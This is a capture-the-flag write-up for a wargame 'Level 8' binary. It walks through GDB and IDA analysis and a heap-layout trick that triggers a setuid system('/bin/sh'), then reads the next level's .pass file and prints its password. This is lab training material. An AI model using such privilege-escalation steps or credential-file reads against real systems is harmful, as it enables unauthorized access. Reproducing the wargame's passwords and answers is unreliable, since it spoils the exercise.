# Level 8

## Requirements

- None

## Walkthrough

1. Login
    
    ```bash
    > ssh -p 4242 level8@192.168.1.66
    Password: 5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
    
    GCC stack protector support:            Enabled
      Strict user copy checks:                Disabled
      Restrict /dev/mem access:               Enabled
      Restrict /dev/kmem access:              Enabled
      grsecurity / PaX: No GRKERNSEC
      Kernel Heap Hardening: No KERNHEAP
     System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
    RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
    No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level8/level8
    ```
    
2. Check file
    
    ```bash
    > ls -l
    total 8
    -rwsr-s---+ 1 level9 users 6057 Mar  6  2016 level8
    
    > ./level8 
    (nil), (nil) 
    qwe
    (nil), (nil) 
    qwe
    (nil), (nil) 
    ^D
    > ./level8 qwe
    (nil), (nil) 
    asd
    (nil), (nil) 
    ^D
    ```
    
3. Looks like the program ignores arguments, and wait for `stdin`. Analyse with GDB.
    
    ```bash
    > gdb level8
    ...
    
    > (gdb) info functions
    All defined functions:
    
    Non-debugging symbols:
    0x080483c4  _init
    0x08048410  printf
    0x08048410  printf@plt
    0x08048420  free
    0x08048420  free@plt
    0x08048430  strdup
    0x08048430  strdup@plt
    0x08048440  fgets
    0x08048440  fgets@plt
    0x08048450  fwrite
    0x08048450  fwrite@plt
    0x08048460  strcpy
    0x08048460  strcpy@plt
    0x08048470  malloc
    0x08048470  malloc@plt
    0x08048480  system
    0x08048480  system@plt
    0x08048490  __gmon_start__
    0x08048490  __gmon_start__@plt
    0x080484a0  __libc_start_main
    0x080484a0  __libc_start_main@plt
    0x080484b0  _start
    0x080484e0  __do_global_dtors_aux
    0x08048540  frame_dummy
    0x08048564  main
    0x08048740  __libc_csu_init
    0x080487b0  __libc_csu_fini
    0x080487b2  __i686.get_pc_thunk.bx
    0x080487c0  __do_global_ctors_aux
    0x080487ec  _fini
    
    > (gdb) info variables
    All defined variables:
    
    Non-debugging symbols:
    0x08048808  _fp_hw
    0x0804880c  _IO_stdin_used
    0x08048948  __FRAME_END__
    0x0804994c  __CTOR_LIST__
    0x0804994c  __init_array_end
    0x0804994c  __init_array_start
    0x08049950  __CTOR_END__
    0x08049954  __DTOR_LIST__
    0x08049958  __DTOR_END__
    0x0804995c  __JCR_END__
    0x0804995c  __JCR_LIST__
    0x08049960  _DYNAMIC
    0x08049a2c  _GLOBAL_OFFSET_TABLE_
    0x08049a60  __data_start
    0x08049a60  data_start
    0x08049a64  __dso_handle
    0x08049a80  stdin@@GLIBC_2.0
    0x08049aa0  stdout@@GLIBC_2.0
    0x08049aa4  completed.6159
    0x08049aa8  dtor_idx.6161
    0x08049aac  auth
    0x08049ab0  service
    ```
    
4. Ok, so we only have a `main` here, but we also noticed 2 variables `auth` and `service`.
    
    ```bash
    > (gdb) disas main
    Dump of assembler code for function main:
       0x08048564 <+0>:	push   %ebp
       0x08048565 <+1>:	mov    %esp,%ebp
       0x08048567 <+3>:	push   %edi
       0x08048568 <+4>:	push   %esi
       0x08048569 <+5>:	and    $0xfffffff0,%esp
       0x0804856c <+8>:	sub    $0xa0,%esp
       0x08048572 <+14>:	jmp    0x8048575 <main+17>
       0x08048574 <+16>:	nop
       0x08048575 <+17>:	mov    0x8049ab0,%ecx
       0x0804857b <+23>:	mov    0x8049aac,%edx
       0x08048581 <+29>:	mov    $0x8048810,%eax
       0x08048586 <+34>:	mov    %ecx,0x8(%esp)
       0x0804858a <+38>:	mov    %edx,0x4(%esp)
       0x0804858e <+42>:	mov    %eax,(%esp)
       0x08048591 <+45>:	call   0x8048410 <printf@plt>
       0x08048596 <+50>:	mov    0x8049a80,%eax
       0x0804859b <+55>:	mov    %eax,0x8(%esp)
       0x0804859f <+59>:	movl   $0x80,0x4(%esp)
       0x080485a7 <+67>:	lea    0x20(%esp),%eax
       0x080485ab <+71>:	mov    %eax,(%esp)
       0x080485ae <+74>:	call   0x8048440 <fgets@plt>
       0x080485b3 <+79>:	test   %eax,%eax
       0x080485b5 <+81>:	je     0x804872c <main+456>
       0x080485bb <+87>:	lea    0x20(%esp),%eax
       0x080485bf <+91>:	mov    %eax,%edx
       0x080485c1 <+93>:	mov    $0x8048819,%eax
       0x080485c6 <+98>:	mov    $0x5,%ecx
       0x080485cb <+103>:	mov    %edx,%esi
       0x080485cd <+105>:	mov    %eax,%edi
       0x080485cf <+107>:	repz cmpsb %es:(%edi),%ds:(%esi)
       0x080485d1 <+109>:	seta   %dl
       0x080485d4 <+112>:	setb   %al
       0x080485d7 <+115>:	mov    %edx,%ecx
       0x080485d9 <+117>:	sub    %al,%cl
       0x080485db <+119>:	mov    %ecx,%eax
       0x080485dd <+121>:	movsbl %al,%eax
       0x080485e0 <+124>:	test   %eax,%eax
       0x080485e2 <+126>:	jne    0x8048642 <main+222>
       0x080485e4 <+128>:	movl   $0x4,(%esp)
       0x080485eb <+135>:	call   0x8048470 <malloc@plt>
       0x080485f0 <+140>:	mov    %eax,0x8049aac
       0x080485f5 <+145>:	mov    0x8049aac,%eax
       0x080485fa <+150>:	movl   $0x0,(%eax)
       0x08048600 <+156>:	lea    0x20(%esp),%eax
       0x08048604 <+160>:	add    $0x5,%eax
       0x08048607 <+163>:	movl   $0xffffffff,0x1c(%esp)
       0x0804860f <+171>:	mov    %eax,%edx
       0x08048611 <+173>:	mov    $0x0,%eax
       0x08048616 <+178>:	mov    0x1c(%esp),%ecx
       0x0804861a <+182>:	mov    %edx,%edi
       0x0804861c <+184>:	repnz scas %es:(%edi),%al
       0x0804861e <+186>:	mov    %ecx,%eax
       0x08048620 <+188>:	not    %eax
       0x08048622 <+190>:	sub    $0x1,%eax
       0x08048625 <+193>:	cmp    $0x1e,%eax
       0x08048628 <+196>:	ja     0x8048642 <main+222>
       0x0804862a <+198>:	lea    0x20(%esp),%eax
       0x0804862e <+202>:	lea    0x5(%eax),%edx
       0x08048631 <+205>:	mov    0x8049aac,%eax
       0x08048636 <+210>:	mov    %edx,0x4(%esp)
       0x0804863a <+214>:	mov    %eax,(%esp)
       0x0804863d <+217>:	call   0x8048460 <strcpy@plt>
       0x08048642 <+222>:	lea    0x20(%esp),%eax
       0x08048646 <+226>:	mov    %eax,%edx
       0x08048648 <+228>:	mov    $0x804881f,%eax
       0x0804864d <+233>:	mov    $0x5,%ecx
       0x08048652 <+238>:	mov    %edx,%esi
       0x08048654 <+240>:	mov    %eax,%edi
       0x08048656 <+242>:	repz cmpsb %es:(%edi),%ds:(%esi)
       0x08048658 <+244>:	seta   %dl
       0x0804865b <+247>:	setb   %al
       0x0804865e <+250>:	mov    %edx,%ecx
       0x08048660 <+252>:	sub    %al,%cl
       0x08048662 <+254>:	mov    %ecx,%eax
       0x08048664 <+256>:	movsbl %al,%eax
       0x08048667 <+259>:	test   %eax,%eax
       0x08048669 <+261>:	jne    0x8048678 <main+276>
       0x0804866b <+263>:	mov    0x8049aac,%eax
       0x08048670 <+268>:	mov    %eax,(%esp)
       0x08048673 <+271>:	call   0x8048420 <free@plt>
       0x08048678 <+276>:	lea    0x20(%esp),%eax
       0x0804867c <+280>:	mov    %eax,%edx
       0x0804867e <+282>:	mov    $0x8048825,%eax
       0x08048683 <+287>:	mov    $0x6,%ecx
       0x08048688 <+292>:	mov    %edx,%esi
       0x0804868a <+294>:	mov    %eax,%edi
       0x0804868c <+296>:	repz cmpsb %es:(%edi),%ds:(%esi)
       0x0804868e <+298>:	seta   %dl
       0x08048691 <+301>:	setb   %al
       0x08048694 <+304>:	mov    %edx,%ecx
       0x08048696 <+306>:	sub    %al,%cl
       0x08048698 <+308>:	mov    %ecx,%eax
       0x0804869a <+310>:	movsbl %al,%eax
       0x0804869d <+313>:	test   %eax,%eax
       0x0804869f <+315>:	jne    0x80486b5 <main+337>
       0x080486a1 <+317>:	lea    0x20(%esp),%eax
       0x080486a5 <+321>:	add    $0x7,%eax
       0x080486a8 <+324>:	mov    %eax,(%esp)
       0x080486ab <+327>:	call   0x8048430 <strdup@plt>
       0x080486b0 <+332>:	mov    %eax,0x8049ab0
       0x080486b5 <+337>:	lea    0x20(%esp),%eax
       0x080486b9 <+341>:	mov    %eax,%edx
       0x080486bb <+343>:	mov    $0x804882d,%eax
       0x080486c0 <+348>:	mov    $0x5,%ecx
       0x080486c5 <+353>:	mov    %edx,%esi
       0x080486c7 <+355>:	mov    %eax,%edi
       0x080486c9 <+357>:	repz cmpsb %es:(%edi),%ds:(%esi)
       0x080486cb <+359>:	seta   %dl
       0x080486ce <+362>:	setb   %al
       0x080486d1 <+365>:	mov    %edx,%ecx
       0x080486d3 <+367>:	sub    %al,%cl
       0x080486d5 <+369>:	mov    %ecx,%eax
       0x080486d7 <+371>:	movsbl %al,%eax
       0x080486da <+374>:	test   %eax,%eax
       0x080486dc <+376>:	jne    0x8048574 <main+16>
       0x080486e2 <+382>:	mov    0x8049aac,%eax
       0x080486e7 <+387>:	mov    0x20(%eax),%eax
       0x080486ea <+390>:	test   %eax,%eax
       0x080486ec <+392>:	je     0x80486ff <main+411>
       0x080486ee <+394>:	movl   $0x8048833,(%esp)
       0x080486f5 <+401>:	call   0x8048480 <system@plt>
       0x080486fa <+406>:	jmp    0x8048574 <main+16>
       0x080486ff <+411>:	mov    0x8049aa0,%eax
       0x08048704 <+416>:	mov    %eax,%edx
       0x08048706 <+418>:	mov    $0x804883b,%eax
       0x0804870b <+423>:	mov    %edx,0xc(%esp)
       0x0804870f <+427>:	movl   $0xa,0x8(%esp)
       0x08048717 <+435>:	movl   $0x1,0x4(%esp)
       0x0804871f <+443>:	mov    %eax,(%esp)
       0x08048722 <+446>:	call   0x8048450 <fwrite@plt>
       0x08048727 <+451>:	jmp    0x8048574 <main+16>
       0x0804872c <+456>:	nop
       0x0804872d <+457>:	mov    $0x0,%eax
       0x08048732 <+462>:	lea    -0x8(%ebp),%esp
       0x08048735 <+465>:	pop    %esi
       0x08048736 <+466>:	pop    %edi
       0x08048737 <+467>:	pop    %ebp
       0x08048738 <+468>:	ret    
    End of assembler dump.
    ```
    
5. Pseudo-code using IDA
    
    ```c
    char * auth;
    char * service;
    
    int main(int argc, const char **argv, const char **envp)
    {
      char buffer[5]; // [esp+20h] [ebp-88h] BYREF
      char auth_cpy[2]; // [esp+25h] [ebp-83h] BYREF
      char svc_dup; // [esp+27h] [ebp-81h] BYREF
    
      while ( 1 )
      {
        printf("%p, %p \n", auth, service);
        
        if ( !fgets(buffer, 128, stdin) )
          break;
          
        if ( !memcmp(buffer, "auth ", 5u) )
        {
          auth = malloc(4);
          *auth = 0;
          
          if ( strlen(auth_cpy) <= 30 )
            strcpy(auth, auth_cpy);
        }
        
        if ( !memcmp(buffer, "reset", 5u) )
          free(auth);
          
        if ( !memcmp(buffer, "service", 6u) )
          service = strdup(&svc_dup);
          
        if ( !memcmp(buffer, "login", 5u) )
        {
          if ( *(auth + 8) )
            system("/bin/sh");
          else
            fwrite("Password:\n", 1, 10, stdout);
        }
      }
      
      return 0;
    }
    ```
    
6. Ok, so first thing we noticed is that we have a `system("/bin/sh")` call, therefore, our intuition tell us to start by checking the required steps to access it.
The easy one is that we have to input `login`.
    
    ```bash
    > ./level8
    (nil), (nil) 
    login
    Segmentation fault (core dumped)
    ```
    
7. Now, we also need to find a way to set `*(auth + 8)`. To do so, multiple step are mandatory.
Since `auth` is not defined, we have to input `auth`  (do not forget the space at the end) to `malloc` it.
    
    ```bash
    > ./level8
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    ```
    
8. Great, let’s check the memory.
    
    ```bash
    > (gdb) x/16x $sp
    0xbffff690:	0x0804a008	0xbffff6b5	0xb7fd1ac0	0xb7fd0ff4
    0xbffff6a0:	0xbffff6ee	0xbffff6ef	0x00000001	0xffffffff
    0xbffff6b0:	0x68747561	0xbf000a20	0x00000000	0xb7ff3fec
    0xbffff6c0:	0xbffff774	0x00000000	0x00000000	0xb7e5ec73
    ```
    
9. As expected we have our `0x68747561 == 'auth'` and  `0x0a20 == ' \n'`.
An important thing to notice, is that our buffer has a size of `5` bytes, but we have input `6`, therefore the `0x0a == '\n'` is stored in `auth_cpy` (buffer overflow). Thus, this `\n` will be copied into `auth`.
    
    ```bash
    > (gdb) info proc mappings
    process 2848
    Mapped address spaces:
    
    Start Addr   End Addr       Size     Offset objfile
     0x8048000  0x8049000     0x1000        0x0 /home/user/level8/level8
     0x8049000  0x804a000     0x1000        0x0 /home/user/level8/level8
     0x804a000  0x806b000    0x21000        0x0 [heap]
    0xb7e2b000 0xb7e2c000     0x1000        0x0 
    0xb7e2c000 0xb7fcf000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
    0xb7fcf000 0xb7fd1000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
    0xb7fd1000 0xb7fd2000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
    0xb7fd2000 0xb7fd5000     0x3000        0x0 
    0xb7fd9000 0xb7fdd000     0x4000        0x0 
    0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
    0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
    0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
    0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
    0xbffdf000 0xc0000000    0x21000        0x0 [stack]
    
    > (gdb) x/16x 0x0804a000
    0x804a000:	0x00000000	0x00000011	0x0000000a	0x00000000
    0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
    0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
    ```
    
10. Amazing, so we know that `auth` address is `0x0804a008`, and since we need to set `auth+8`, its address is `0x0804a028`, meaning that we need an overflow of `8 * 4 + 1 = 33`bytes.
The idea would be to provide more data from the input `auth`  , however, there is a guard which is limiting the copy to `30` bytes, so we can’t do it with the `auth` input.
    
    ```c
    if ( strlen(auth_cpy) <= 30 )
    ```
    
11. We know that `auth` is `malloc`ed, therefore, defined on the `heap`, so another way to set `auth+8` , could be to `malloc` more element until the destination is reached.
Inputing `auth`  again would `malloc` again, but it would also set `auth` pointer, so would not change anything to the issue.
The only other function using the `heap` that we have access to, is `strdup`, and we can call it by inputing `service`. The same `buffer` is used for all inputs, so any overflow would also overwrite `auth_cpy` (2 bytes) and `svc_dup`, but let’s try a single `service` first.
    
    ```bash
    > (gdb) r
    Starting program: /home/user/level8/level8 
    (nil), (nil) 
    auth 
    
    Breakpoint 1, 0x08048574 in main ()
    
    > (gdb) x/16x $sp
    0xbffff690:	0x0804a008	0xbffff6b5	0xb7fd1ac0	0xb7fd0ff4
    0xbffff6a0:	0xbffff6ee	0xbffff6ef	0x00000001	0xffffffff
    0xbffff6b0:	0x68747561	0xbf000a20	0x00000000	0xb7ff3fec
    0xbffff6c0:	0xbffff774	0x00000000	0x00000000	0xb7e5ec73
    > (gdb) x/16x 0x0804a000
    0x804a000:	0x00000000	0x00000011	0x0000000a	0x00000000
    0x804a010:	0x00000000	0x00020ff1	0x00000000	0x00000000
    0x804a020:	0x00000000	0x00000000	0x00000000	0x00000000
    0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
    
    > (gdb) c
    Continuing.
    0x804a008, (nil) 
    service
    
    Breakpoint 1, 0x08048574 in main ()
    
    > (gdb) x/16x $sp
    0xbffff690:	0xbffff6b7	0x00000080	0xb7fd1ac0	0xb7fd0ff4
    0xbffff6a0:	0xbffff6ee	0xbffff6ef	0x00000001	0xffffffff
    0xbffff6b0:	0x76726573	0x0a656369	0x00000000	0xb7ff3fec
    0xbffff6c0:	0xbffff774	0x00000000	0x00000000	0xb7e5ec73
    > (gdb) x/16x 0x0804a000
    0x804a000:	0x00000000	0x00000011	0x0000000a	0x00000000
    0x804a010:	0x00000000	0x00000011	0x0000000a	0x00000000
    0x804a020:	0x00000000	0x00020fe1	0x00000000	0x00000000
    0x804a030:	0x00000000	0x00000000	0x00000000	0x00000000
    ```
    
12. We almost got it! The `service\n` input will set `buffer = 'servi'`, `auth_cpy = 'ce'` and `svc_dup = '\n'`, so the `strdup` is called with `\n`, which is internally `malloc`ed, and pushed on the `heap` at `0x0804a018`, but we want `0x0804a028`, so 1 more call is required.
    
    ```bash
    > (gdb) c
    Continuing.
    0x804a008, 0x804a018 
    service
    
    Breakpoint 1, 0x08048574 in main ()
    
    > (gdb) x/16x $sp
    0xbffff690:	0xbffff6b7	0x00000080	0xb7fd1ac0	0xb7fd0ff4
    0xbffff6a0:	0xbffff6ee	0xbffff6ef	0x00000001	0xffffffff
    0xbffff6b0:	0x76726573	0x0a656369	0x00000000	0xb7ff3fec
    0xbffff6c0:	0xbffff774	0x00000000	0x00000000	0xb7e5ec73
    > (gdb) x/16x 0x0804a000
    0x804a000:	0x00000000	0x00000011	0x0000000a	0x00000000
    0x804a010:	0x00000000	0x00000011	0x0000000a	0x00000000
    0x804a020:	0x00000000	0x00000011	0x0000000a	0x00000000
    0x804a030:	0x00000000	0x00020fd1	0x00000000	0x00000000
    ```
    
13. Yes! Should be good now. All we need now is to input `login` and we should have a shell prompt.
    
    ```bash
    > (gdb) c
    Continuing.
    0x804a008, 0x804a028 
    login
    $ 
    ```
    
14. It works! Get the flag!
    
    ```bash
    > ./level8 
    (nil), (nil) 
    auth 
    0x804a008, (nil) 
    service
    0x804a008, 0x804a018 
    service
    0x804a008, 0x804a028 
    login
    $ whoami
    level9
    $ pwd
    /home/user/level8
    $ cat /home/user/level9/.pass
    c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
    ```
    

## Documentation

- None